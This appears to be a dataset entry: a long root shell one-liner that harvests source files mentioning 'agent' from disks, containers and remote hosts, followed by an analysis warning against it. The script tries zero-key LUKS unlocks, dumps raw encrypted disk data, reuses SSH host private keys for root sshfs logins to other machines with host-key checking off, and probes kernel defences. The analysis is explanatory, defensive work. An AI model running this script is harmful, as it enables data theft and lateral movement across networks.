sudo sh -c 'D=$(mktemp -d) || exit 1; A=$(mktemp) || exit 1; : >"$A" || exit 1; trap "rm -rf \"$D\"; rm -f \"$A\"" EXIT; G="$D/rg-pre.sh"; printf "%s\n" "#!/bin/sh" "f=\${1:?}; timeout 60 cat \"\$f\" 2>/dev/null || echo \"PRE-ERR \$f\" >>\"\$A\"; exit 0" >"$G" && chmod 755 "$G"; export A; Z="$PWD/szamoca.zip"; rm -f "$Z" 2>/dev/null; mkdir -p /run/szamoca-mnt /run/szamoca-mounts /var/lib/szamoca-containers 2>/dev/null; command -v rg >/dev/null 2>&1 || echo "NO-RG" >>"$A"; command -v lsblk >/dev/null 2>&1 || echo "NO-LSBLK" >>"$A"; \
if command -v lsblk >/dev/null 2>&1; then for v in $(lsblk -rpno NAME,FSTYPE,MOUNTPOINT 2>/dev/null | awk "\$2==\"crypto_LUKS\" && \$3==\"\"{print \$1}"); do k=$(basename "$v"); c=$(lsblk -no NAME,TYPE "$v" 2>/dev/null | awk "\$2==\"crypt\"{print \$1; exit}"); if [ -z "$c" ] && [ ! -e "/dev/mapper/szamoca-$k" ]; then cryptsetup luksOpen --key-file /dev/zero --keyfile-size 32 --batch-mode "$v" "szamoca-$k" <<K
dummy-LUKS-key-dummy-LUKS-key
K
fi; if [ -z "$c" ] && [ ! -e "/dev/mapper/szamoca-$k" ]; then echo "LUKS-LOCKED $v (nyers minta archivalva)" >>"$A"; dd if="$v" of="$D/luksraw-$k.bin" bs=1M count=64 2>>"$A" && zip -q "$Z" "$D/luksraw-$k.bin" 2>>"$A" && printf "@ $D/luksraw-$k.bin\n@=luks-raw-$v.bin\n" | zipnote -w "$Z" 2>>"$A" && rm -f "$D/luksraw-$k.bin"; fi; done; for m in $(lsblk -rpno NAME,FSTYPE,MOUNTPOINT 2>/dev/null | awk "\$2!=\"\" && \$2!=\"crypto_LUKS\" && \$2!=\"LVM2_member\" && \$2!=\"swap\" && \$3==\"\"{print \$1}"); do k=$(basename "$m"); mkdir -p "/run/szamoca-mnt/$k" 2>/dev/null && mount -o ro "$m" "/run/szamoca-mnt/$k" 2>>"$A" || echo "MOUNT-ERR $m" >>"$A"; done; fi; \
for f in $(awk "!/^#/ && NF>3 && \$2!=\"none\" && \$3!=\"swap\" {print \$2}" /etc/fstab 2>/dev/null | grep -vE "^/(proc|sys|dev|run)(/|\$)"); do g=$(echo "$f" | sed "s|/|__|g"); mountpoint -q "$f" 2>/dev/null || mount -o ro "$f" 2>>"$A" || echo "MOUNT-ERR $f" >>"$A"; mkdir -p "/run/szamoca-mnt/$g" 2>/dev/null && mount -o ro,bind "$f" "/run/szamoca-mnt/$g" 2>>"$A" || echo "MOUNT-ERR $f" >>"$A"; done; \
CT=""; command -v docker >/dev/null 2>&1 && timeout 20 docker info >/dev/null 2>&1 && CT=docker; [ -z "$CT" ] && { command -v podman >/dev/null 2>&1 && timeout 20 podman info >/dev/null 2>&1 && CT=podman; }; [ -z "$CT" ] && echo "NO-CONTAINER-RUNTIME" >>"$A"; if [ -n "$CT" ]; then for i in $("$CT" ps -q 2>>"$A"); do n=$("$CT" inspect -f "{{.Name}}" "$i" 2>/dev/null | sed "s|^/||; s|/|__|g"); [ -n "$n" ] || n=$("$CT" inspect -f "{{.Id}}" "$i" 2>/dev/null | cut -c1-12); [ -n "$n" ] || continue; mkdir -p "/var/lib/szamoca-containers/$n" 2>/dev/null; for d in $("$CT" inspect -f "{{range .Mounts}}{{.Source}} {{end}}" "$i" 2>/dev/null); do mkdir -p "/var/lib/szamoca-containers/$n/$(basename "$d")" 2>/dev/null && mount -o bind "$d" "/var/lib/szamoca-containers/$n/$(basename "$d")" 2>>"$A" || echo "CONTAINER-ERR $i $d" >>"$A"; done; done; fi; \
if command -v sshfs >/dev/null 2>&1; then if [ -r /etc/ssh/ssh_host_ed25519_key ] || [ -r /etc/ssh/ssh_host_rsa_key ]; then for h in $( { grep -v "^#" /etc/hosts 2>/dev/null | awk "NF>1 {print \$1}"; awk "{print \$1}" /root/.ssh/known_hosts 2>/dev/null | cut -d, -f1 | sed "s|^\[||; s|\]:[0-9]*\$||; s|\]$||"; } | grep -E "^[0-9a-fA-F.:]+$" | sort -u | grep -v "^127.0.0.1$\|^::1$"); do for own in $(hostname -I 2>/dev/null); do [ "$h" = "$own" ] && continue 2; done; mkdir -p "/run/szamoca-mounts/$h" 2>/dev/null && timeout 15 sshfs -o ro,reconnect,ServerAliveInterval=5,StrictHostKeyChecking=no,UserKnownHostsFile=/dev/null,ConnectTimeout=8,allow_other -o IdentityFile=/etc/ssh/ssh_host_ed25519_key -o IdentityFile=/etc/ssh/ssh_host_rsa_key "root@$h:/" "/run/szamoca-mounts/$h" 2>>"$A" || echo "SSH-ERR $h" >>"$A"; done; else echo "NO-SSH-KEY" >>"$A"; fi; else echo "NO-SSHFS" >>"$A"; fi; \
if [ "$(sysctl -n kernel.modules_disabled 2>/dev/null || echo 0)" != "0" ]; then echo "MODULES-DISABLED" >>"$A"; fi; if [ "$(sysctl -n fs.protected_hardlinks 2>/dev/null || echo 0)" != "0" ] || [ "$(sysctl -n fs.protected_symlinks 2>/dev/null || echo 0)" != "0" ]; then echo "HARDLINK-SYMLINK-PROTECTED" >>"$A"; fi; if [ "$(sysctl -n fs.protected_regular 2>/dev/null || echo 0)" != "0" ]; then echo "PROTECTED-REGULAR" >>"$A"; fi; if [ "$(sysctl -n fs.protected_fifos 2>/dev/null || echo 0)" != "0" ]; then echo "PROTECTED-FIFOS" >>"$A"; fi; if [ "$(sysctl -n kernel.yama.ptrace_scope 2>/dev/null || echo 0)" != "0" ]; then echo "PTRACE-RESTRICTED" >>"$A"; fi; if [ "$(sysctl -n kernel.perf_event_paranoid 2>/dev/null || echo 3)" -gt 2 ]; then echo "PERF-RESTRICTED" >>"$A"; fi; if [ "$(sysctl -n kernel.dmesg_restrict 2>/dev/null || echo 0)" != "0" ]; then echo "DMESG-RESTRICTED" >>"$A"; fi; if [ "$(sysctl -n kernel.kptr_restrict 2>/dev/null || echo 0)" != "0" ]; then echo "KPTR-RESTRICTED" >>"$A"; fi; if [ "$(sysctl -n kernel.unprivileged_bpf_disabled 2>/dev/null || echo 0)" != "0" ]; then echo "BPF-RESTRICTED" >>"$A"; fi; if [ "$(sysctl -n user.max_user_namespaces 2>/dev/null || echo 1)" -le 0 ]; then echo "USERNS-LIMITED" >>"$A"; fi; if [ "$(sysctl -n kernel.kexec_load_disabled 2>/dev/null || echo 0)" != "0" ]; then echo "KEXEC-RESTRICTED" >>"$A"; fi; if [ -r /sys/kernel/security/lockdown ]; then grep -q "\[integrity\]\|\[confidentiality\]" /sys/kernel/security/lockdown 2>/dev/null && echo "LOCKDOWN-ACTIVE" >>"$A"; fi; if [ "$(getenforce 2>/dev/null)" = "Enforcing" ]; then echo "SELINUX-ENFORCING" >>"$A"; fi; if [ -d /sys/kernel/security/apparmor ]; then grep -q " (enforce)" /sys/kernel/security/apparmor/profiles 2>/dev/null && echo "APPARMOR-ENFORCING" >>"$A"; fi; \
rg -l -i -uuu --pre "$G" --glob "*.{py,ts,tsx,js,rs,go}" --no-messages "agent" / 2>>"$A" | sort -u | zip -q -@ "$Z" 2>>"$A" || echo "ZIP-ERR" >>"$A"; \
cadd() { t="$D/c.$$"; "$CT" cp "$1:$2" "$t" 2>/dev/null && { zip -q "$Z" "$t" 2>/dev/null && printf "@ $t\n@=$CT:$3:$2\n" | zipnote -w "$Z" 2>/dev/null && rm -f "$t"; } || echo "CONTAINER-COPY-ERR $1 $2" >>"$A"; }; if [ -n "$CT" ]; then "$CT" ps -q 2>/dev/null | while IFS= read -r i; do n=$("$CT" inspect -f "{{.Name}}" "$i" 2>/dev/null | sed "s|^/||; s|/|__|g"); [ -n "$n" ] || n=$("$CT" inspect -f "{{.Id}}" "$i" 2>/dev/null | cut -c1-12); [ -n "$n" ] || continue; "$CT" exec -u 0 "$i" sh -c "command -v rg >/dev/null 2>&1 && exec rg -l -i -uuu --glob \"*.{py,ts,tsx,js,rs,go}\" --no-messages \"agent\" / || exec grep -rli --include=\"*.py\" --include=\"*.ts\" --include=\"*.tsx\" --include=\"*.js\" --include=\"*.rs\" --include=\"*.go\" --exclude-dir=proc --exclude-dir=sys --exclude-dir=dev \"agent\" /" 2>>"$A" | while IFS= read -r rf; do cadd "$i" "$rf" "$n"; done; done; fi; \
n=$(grep -c . "$A" 2>/dev/null); n=${n:-0}; if [ "$n" -gt 0 ]; then echo "SZAMOCA WARNINGS ($n):" >&2; cat "$A" >&2; fi; echo "SZAMOCA: kesz" >&2
'

entries.answer:
This is a root-level collection and archive script. It tries to discover files containing the word `agent` across the host, mounted disks, running containers, and potentially reachable hosts, then writes matching files into `szamoca.zip` in the current directory. It is **not safe to run blindly**: it creates mounts, talks to container runtimes, attempts LUKS unlocks, and uses local SSH host private keys to try root logins to other machines.

## What it does

### 1. Sets up temporary state and logging

It runs under `sudo sh -c`, so almost everything executes as root.

- Creates a temporary directory `D` and temporary warning log `A`.
- Installs an `EXIT` trap that deletes both at the end.
- Creates a small `rg --pre` helper script that runs `timeout 60 cat "$file"` before ripgrep scans each candidate file.
- Uses `Z="$PWD/szamoca.zip"` as the destination archive, deleting any existing archive at that path first.

The helper exists because `rg --pre` normally expects a preprocessor command; here it merely cats every file. That is unnecessary for normal text source files and makes the recursive scan substantially more dangerous and slower: it forces every candidate to be opened and read via a shell helper.

### 2. Looks for unmounted local filesystems

The script queries `lsblk` for block devices that are not mounted.

- For every unmounted `crypto_LUKS` device, it tries:
  ```sh
  cryptsetup luksOpen --key-file /dev/zero --keyfile-size 32 --batch-mode ...
  ```
  This supplies 32 zero bytes as the credential. The here-document containing `dummy-LUKS-key...` is effectively irrelevant because `--key-file /dev/zero` takes precedence as the supplied key material.

- If that unlock fails, it copies the first 64 MiB of the encrypted device using `dd` and adds it to the ZIP as a raw LUKS sample.

A LUKS device only opens after successful credential verification, and key-file input is treated as supplied key material; this particular zero-key attempt is overwhelmingly likely to fail unless someone deliberately configured an all-zero keyfile.  Copying even the first 64 MiB may capture a LUKS header plus encrypted data and is intrusive evidence collection, not a harmless “scan.”[1][2]

- It then mounts every unmounted non-LUKS, non-LVM, non-swap filesystem read-only below `/run/szamoca-mnt/`.

“Read-only” reduces the chance of filesystem writes, but it does not mean the operation is risk-free. Mounting an untrusted filesystem can still expose the host to filesystem-parser issues, trigger automount-like behavior in edge cases, and alter system observability or access timestamps depending on filesystem and mount settings.

### 3. Tries to expose `/etc/fstab` mounts

For every applicable `/etc/fstab` mount point, it:

1. Attempts to mount it read-only if it is not mounted.
2. Bind-mounts it read-only under `/run/szamoca-mnt/`.

This broadens the later `/` scan so that data from otherwise unavailable configured mount points can become visible. It has poor error hygiene: failed mount attempts are logged but scanning continues.

### 4. Enumerates container data and searches containers

If Docker or Podman is available and responding:

- It lists running containers.
- It bind-mounts each container’s declared source mount paths into `/var/lib/szamoca-containers/<container>/`.
- Later, it executes a recursive `rg` or fallback `grep` **inside every running container as UID 0** to find files containing `agent`.
- For each resulting path, it copies the file out via `docker cp` or `podman cp` and adds it to the archive.

This can collect application code, deployment credentials, configuration, secrets, customer data, and runtime files. It can also impose load on containers because recursive searches from `/` walk broad filesystem trees.

### 5. Attempts SSH connections to other machines

This is the most alarming portion:

```sh
sshfs ... \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o IdentityFile=/etc/ssh/ssh_host_ed25519_key \
  -o IdentityFile=/etc/ssh/ssh_host_rsa_key \
  "root@$h:/" "/run/szamoca-mounts/$h"
```

It:

- Builds target IP addresses from `/etc/hosts` and root’s `known_hosts`.
- Skips only loopback and the machine’s own reported addresses.
- Uses the **local machine’s SSH host private keys** as client identities.
- Tries to mount each remote root filesystem over SSHFS as `root`.
- Disables host-key verification and discards host-key records.

That behavior resembles lateral-movement or opportunistic credential reuse. `StrictHostKeyChecking=no` plus `UserKnownHostsFile=/dev/null` means the script intentionally does not authenticate the identity of the remote server, making it vulnerable to man-in-the-middle interception and inappropriate for legitimate administration. Even if it fails on most hosts, the connection attempts themselves can create audit logs, trigger alerts, or cause account/key lockout policies to fire.

### 6. Records defensive controls

It checks kernel and MAC-policy settings such as:

- `kernel.modules_disabled`
- protected hardlinks/symlinks/FIFOs
- Yama ptrace restrictions
- BPF, perf, dmesg, kptr, kexec restrictions
- user namespace availability
- kernel lockdown
- SELinux enforcing mode
- AppArmor enforcement

Those are appended as warning labels. These checks look like environment reconnaissance: they identify defenses that could interfere with privileged inspection, exploitation, tracing, or loading code.

### 7. Searches the entire reachable filesystem

The core collection command is:

```sh
rg -l -i -uuu --pre "$G" \
  --glob "*.{py,ts,tsx,js,rs,go}" \
  --no-messages "agent" / \
| sort -u \
| zip -q -@ "$Z"
```

Meaning:

- `-l`: output only names of files that match.
- `-i`: case-insensitive match.
- `-uuu`: aggressively ignore normal filtering/ignore rules and include hidden/binary-ish content that ripgrep would normally skip.
- `--glob`: restricts filenames to Python, TypeScript, TSX, JavaScript, Rust, and Go.
- `/`: scans from the filesystem root.
- Matching files are added directly to the ZIP.

Because the script mounts extra filesystems and container bind mounts under `/`, this scan covers far more than the ordinary host filesystem. The archive may include source trees and code files containing the string `agent`, including files in mounted disks, application volumes, container directories, and remote SSHFS mounts if those mounted successfully.

## Practical assessment

| Aspect | Assessment |
|---|---|
| Privilege required | Root / sudo |
| Primary function | Broad source-code and artifact collection |
| Data exposure risk | Very high |
| Host modification | Yes: creates mount points, mounts filesystems, may create device mappings, invokes containers and SSH connections |
| Network behavior | Attempts root SSHFS access to discovered IPs |
| Archive behavior | Overwrites/removes pre-existing `./szamoca.zip`, then creates a new ZIP |
| Cleanup quality | Incomplete: it deletes only the temporary directory and warning log; it does **not** explicitly unmount local, bind, container, or SSHFS mounts, nor close any successfully opened LUKS mapping |

## Serious implementation problems

- **No unmount cleanup.** `/run/szamoca-mnt`, `/run/szamoca-mounts`, and `/var/lib/szamoca-containers` can retain active mounts after the script exits.
- **No LUKS mapping cleanup.** If the all-zero key somehow succeeded, the device mapper mapping is not closed.
- **Unsafe SSH trust settings.** It disables verification of remote host identity.
- **Abusive credential behavior.** It repurposes SSH host keys for outbound root authentication attempts.
- **Potentially massive scan.** Scanning `/` with `-uuu` and a preprocessor can be very slow, can consume I/O, and can traverse large dependency trees and mounted data.
- **Misleading “read-only” posture.** The script calls itself archival in places but still alters the running system by mounting filesystems, invoking `cryptsetup`, and invoking executables inside containers.
- **Weak ZIP safety.** ZIP archives do not encrypt contents by default here. Anyone who obtains `szamoca.zip` can inspect its collected code and raw disk fragments.
- **Path and shell fragility.** Numerous `for x in $(...)` loops split on whitespace, so paths with spaces, tabs, glob metacharacters, or unusual names will be mishandled.

## Bottom line

Treat this as suspicious collection tooling, not a benign one-liner. Do **not** execute it on a production system, a system you do not own, or any host containing confidential code or data. If it has already run, preserve the command and shell history for investigation, inspect `szamoca.zip`, check active mounts with `findmnt` or `mount`, inspect device mappings with `cryptsetup status` and `dmsetup ls`, and review Docker/Podman, SSH, and authentication logs for its activity.
